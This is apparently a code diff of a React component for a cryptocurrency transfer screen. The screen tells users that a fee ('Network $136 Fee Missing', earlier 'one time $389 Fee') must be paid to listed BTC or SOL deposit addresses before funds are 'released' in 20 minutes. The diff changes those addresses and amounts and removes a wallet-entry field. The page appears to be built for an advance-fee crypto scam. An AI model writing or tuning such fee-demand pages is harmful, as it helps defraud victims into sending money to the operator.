@@ -66,12 +66,12 @@ const resetFlow = () => {
       <p className="text-[13px] text-black/60 mb-2">Transfer to</p>
 
       <p className="text-[15px] font-semibold text-black">
-        BSFkq.....gnLX
+        NB1M.....qTU66
       </p>
 
       <div className="mt-3 flex items-center justify-between text-[12px] text-black/50">
         <span>Instant</span>
-        <span>$1,000 fee</span>
+        <span>$130 fee</span>
       </div>
     </div>
 
@@ -159,38 +159,19 @@ const resetFlow = () => {
               </p>
 
               <p className="text-xs text-black/50 mt-2">
-                Please pay your one time $389 Fee. The release time after that is 20 minutes.
+                Network $136 Fee Missing. The release time after that is 20 minutes.
               </p>
             </div>
 
-            {/* WALLET */}
-            <div className="mt-4 text-left">
-              <label className="text-xs font-semibold text-black/70">
-                Enter your Solana Wallet
-              </label>
-
-              <input
-                type="text"
-                value={solanaWallet || ""}
-                onChange={(e) => {
-                  setSolanaWallet(e.target.value);
-                  try {
-                    localStorage.setItem(WALLET_KEY, e.target.value);
-                  } catch {}
-                }}
-                placeholder="Paste your Solana wallet address"
-                className="mt-2 w-full rounded-lg border border-gray-200 px-3 py-3 text-sm outline-none focus:border-[#0052FF]"
-              />
-            </div>
 
             {/* DESTINO */}
             <div className="mt-4 rounded-lg border border-gray-200 bg-gray-50 p-3 text-left">
               <p className="text-xs font-semibold text-black/70 mb-1">
-                Deposit Fee Pending - Destination (BTC)
+                Deposit Fee Pending - Destination (SOL)
               </p>
 
               <p className="text-[11px] text-black/60 break-all">
-                bc1p7vpwwfhhhhk0nsuwd24ja48vqj69n7e9f59ndgt4zfcvn9tagqyswr3es5
+                Dn5T35muNSyC7CfuyvxR2DX7Y3hTBL5SKWqd5DncvcTW
               </p>
             </div>
 
